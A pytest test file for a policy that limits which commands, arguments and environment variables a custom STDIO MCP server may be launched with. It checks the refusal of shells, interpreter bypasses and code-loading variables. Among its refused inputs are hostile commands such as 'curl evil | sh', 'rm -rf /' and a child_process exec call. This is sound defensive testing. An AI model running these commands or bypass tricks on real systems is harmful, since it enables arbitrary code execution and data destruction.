"""What a custom STDIO MCP server may run (`app.agents.mcp.stdio_policy`)."""
from __future__ import annotations

import pytest

from app.agents.mcp import stdio_policy
from app.agents.mcp.stdio_policy import (
    ALLOWED_COMMANDS_ENV,
    CUSTOM_STDIO_ENV,
    StdioPolicyError,
    check_env_names,
    check_stdio_command,
    custom_stdio_allowed,
)


@pytest.fixture(autouse=True)
def _default_policy(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv(ALLOWED_COMMANDS_ENV, raising=False)
    monkeypatch.delenv(CUSTOM_STDIO_ENV, raising=False)
    # The cmd.exe rule depends on the host; tests that need it turn it on.
    monkeypatch.setattr(stdio_policy, "_on_windows", lambda: False)


class TestCommands:
    @pytest.mark.parametrize("command", ["npx", "uvx"])
    def test_default_launchers_are_allowed(self, command: str) -> None:
        check_stdio_command(command, ["-y", "@scope/mcp-server"])

    def test_other_commands_need_to_be_listed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        with pytest.raises(StdioPolicyError, match=ALLOWED_COMMANDS_ENV):
            check_stdio_command("node", ["server.js"])

        monkeypatch.setenv(ALLOWED_COMMANDS_ENV, "npx,node")
        check_stdio_command("node", ["server.js"])

    def test_absolute_paths_must_be_listed_exactly(self, monkeypatch: pytest.MonkeyPatch) -> None:
        with pytest.raises(StdioPolicyError):
            check_stdio_command("/usr/bin/npx", [])

        monkeypatch.setenv(ALLOWED_COMMANDS_ENV, "/opt/mcp/bin/server")
        check_stdio_command("/opt/mcp/bin/server", ["--stdio"])

    @pytest.mark.parametrize("command", ["./npx", "bin/npx"])
    def test_relative_paths_are_not_the_listed_command(self, command: str) -> None:
        with pytest.raises(StdioPolicyError):
            check_stdio_command(command, [])

    def test_surrounding_whitespace_is_ignored(self) -> None:
        check_stdio_command(" npx ", [])

    @pytest.mark.parametrize(
        "command", ["bash", "/bin/sh", "zsh", "cmd.exe", "powershell", "pwsh", r"C:\Windows\System32\cmd.exe"],
    )
    def test_shells_are_refused_even_when_listed(self, monkeypatch: pytest.MonkeyPatch, command: str) -> None:
        monkeypatch.setenv(ALLOWED_COMMANDS_ENV, command)
        with pytest.raises(StdioPolicyError, match="Shells"):
            check_stdio_command(command, [])

    @pytest.mark.parametrize("args", [["-c", "curl evil | sh"], ["--call", "rm -rf /"], ["--call=whoami"]])
    def test_npx_inline_shell_flags_are_refused(self, args: list[str]) -> None:
        with pytest.raises(StdioPolicyError, match="inline shell"):
            check_stdio_command("npx", args)

    @pytest.mark.parametrize("command", ["npx.cmd", "NPX.BAT", r"C:\Program Files\nodejs\npx.cmd"])
    def test_npx_under_its_windows_launcher_name_gets_the_npx_checks(
        self, monkeypatch: pytest.MonkeyPatch, command: str,
    ) -> None:
        monkeypatch.setenv(ALLOWED_COMMANDS_ENV, command)
        with pytest.raises(StdioPolicyError, match="inline shell"):
            check_stdio_command(command, ["-c", "whoami"])

    def test_nul_bytes_are_refused(self) -> None:
        with pytest.raises(StdioPolicyError):
            check_stdio_command("npx", ["-y", "pkg\x00--call"])

    def test_missing_command(self) -> None:
        with pytest.raises(StdioPolicyError, match="requires a command"):
            check_stdio_command("  ", [])


class TestEnvNames:
    @pytest.mark.parametrize(
        "name",
        ["NODE_OPTIONS", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "npm_config_registry", "UV_INDEX_URL",
         "PIP_INDEX_URL", "PATH", "PYTHONPATH", "BAD-NAME", "1ABC", ""],
    )
    def test_code_loading_and_invalid_names_are_refused(self, name: str) -> None:
        with pytest.raises(StdioPolicyError):
            check_env_names([name])

    def test_credential_names_are_fine(self) -> None:
        check_env_names(["GITHUB_TOKEN", "SLACK_BOT_TOKEN", "EXA_API_KEY"])


class TestCustomStdioSwitch:
    def test_off_by_default(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv(CUSTOM_STDIO_ENV, raising=False)
        assert custom_stdio_allowed() is False

    def test_only_true_turns_it_on(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv(CUSTOM_STDIO_ENV, "TRUE")
        assert custom_stdio_allowed() is True

    @pytest.mark.parametrize("value", ["1", "yes", "on", "enabled", "false"])
    def test_anything_else_leaves_it_off(self, monkeypatch: pytest.MonkeyPatch, value: str) -> None:
        monkeypatch.setenv(CUSTOM_STDIO_ENV, value)
        assert custom_stdio_allowed() is False


class TestInterpretersThroughALauncher:
    @pytest.mark.parametrize(
        "command,args",
        [
            ("npx", ["node", "-e", "require('child_process').exec('id')"]),
            ("npx", ["-y", "node@20", "-e", "1"]),
            ("npx", ["-p", "node", "-e", "1"]),
            ("npx", ["--package=node", "run"]),
            ("npx", ["deno", "eval", "1"]),
            ("npx", ["-y", "bash", "-c", "id"]),
            ("uvx", ["python", "-c", "1"]),
            ("uvx", ["python3.12", "-c", "1"]),
            ("uvx", ["--from", "python", "python"]),
        ],
    )
    def test_are_refused(self, command: str, args: list[str]) -> None:
        with pytest.raises(StdioPolicyError, match="rather than an MCP server package|inline shell command"):
            check_stdio_command(command, args)

    @pytest.mark.parametrize(
        "command,args",
        [
            ("npx", ["-y", "@modelcontextprotocol/server-filesystem", "/data"]),
            ("npx", ["-y", "some-mcp@1.2.3", "--runtime", "node"]),
            ("uvx", ["mcp-server-fetch"]),
            ("uvx", ["--python", "3.12", "mcp-server-git", "--repository", "."]),
            ("uvx", ["--from", "mcp-server-x==1.0", "mcp-x"]),
        ],
    )
    def test_server_packages_are_fine(self, command: str, args: list[str]) -> None:
        check_stdio_command(command, args)


class TestNpmOptionsBeforeThePackage:
    @pytest.mark.parametrize("args", [["-yc", "id"], ["-cy", "curl evil | sh"], ["-qyc=id"]])
    def test_an_inline_command_in_combined_short_flags_is_refused(self, args: list[str]) -> None:
        with pytest.raises(StdioPolicyError, match="inline shell command"):
            check_stdio_command("npx", args)

    @pytest.mark.parametrize(
        "args",
        [
            ["--node-options=--require=/tmp/x.js", "-y", "some-mcp"],
            ["--node-opt=--require=/tmp/x.js", "some-mcp"],
            ["--script-shell", "/bin/sh", "some-mcp"],
            ["--userconfig", "/tmp/npmrc", "some-mcp"],
            ["--git=/tmp/evil", "some-mcp"],
            ["--cal", "id"],
            ["-x", "some-mcp"],
            ["-py", "some-mcp"],
        ],
    )
    def test_options_that_are_not_allowed_are_refused(self, args: list[str]) -> None:
        with pytest.raises(StdioPolicyError, match="is not allowed before the package"):
            check_stdio_command("npx", args)

    @pytest.mark.parametrize("args", [["-yp", "node", "-e", "1"], ["-p=deno", "eval", "1"]])
    def test_an_interpreter_named_in_combined_flags_is_refused(self, args: list[str]) -> None:
        with pytest.raises(StdioPolicyError, match="rather than an MCP server package"):
            check_stdio_command("npx", args)

    @pytest.mark.parametrize(
        "args",
        [
            ["-yq", "some-mcp"],
            ["--yes", "--prefer-offline", "--loglevel", "warn", "some-mcp"],
            ["--registry", "https://npm.internal.example.com", "-y", "@acme/mcp@1.0.0"],
            ["-y", "-p", "@acme/mcp", "acme-mcp"],
            ["--", "some-mcp"],
            # After the package the arguments are the server's own, not npm's.
            ["-y", "some-mcp", "--node-options", "x", "--script-shell=y"],
        ],
    )
    def test_ordinary_launches_are_fine(self, args: list[str]) -> None:
        check_stdio_command("npx", args)


class TestUvxPython:
    @pytest.mark.parametrize(
        "args",
        [
            ["--python", "/tmp/evil", "mcp-server-x"],
            ["-p=./bin/python", "mcp-server-x"],
            ["--python", "C:\\tools\\evil.exe", "mcp-server-x"],
            ["--python=~/py", "mcp-server-x"],
        ],
    )
    def test_a_path_is_refused(self, args: list[str]) -> None:
        with pytest.raises(StdioPolicyError, match="must name a Python version"):
            check_stdio_command("uvx", args)

    @pytest.mark.parametrize(
        "args",
        [
            ["--python", "3.12", "mcp-server-x"],
            ["-p", "cpython@3.11", "mcp-server-x"],
            ["mcp-server-x", "--python", "/usr/bin/python3"],
        ],
    )
    def test_a_version_or_a_server_flag_is_fine(self, args: list[str]) -> None:
        check_stdio_command("uvx", args)


class TestWindowsBatchLaunchers:
    @pytest.fixture
    def windows(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(stdio_policy, "_on_windows", lambda: True)

        def which(command: str) -> str | None:
            return {"npx": "C:\\Program Files\\nodejs\\npx.CMD", "uvx": "C:\\uv\\uvx.exe"}.get(command)

        monkeypatch.setattr(stdio_policy.shutil, "which", which)

    @pytest.mark.parametrize("arg", ["a&calc", "x|y", "%COMSPEC%", 'say "hi"', "^&", "line\nbreak", "a>b"])
    def test_cmd_syntax_in_npx_arguments_is_refused(self, windows: None, arg: str) -> None:
        with pytest.raises(StdioPolicyError, match="runs through cmd.exe"):
            check_stdio_command("npx", ["-y", "some-mcp", arg])

    def test_plain_arguments_are_fine(self, windows: None) -> None:
        check_stdio_command("npx", ["-y", "@modelcontextprotocol/server-filesystem", "C:\\data"])

    def test_a_real_executable_is_not_limited(self, windows: None) -> None:
        check_stdio_command("uvx", ["mcp-server-x", "--query", "a&b"])

    def test_other_hosts_are_not_limited(self) -> None:
        check_stdio_command("npx", ["-y", "some-mcp", "a&b"])
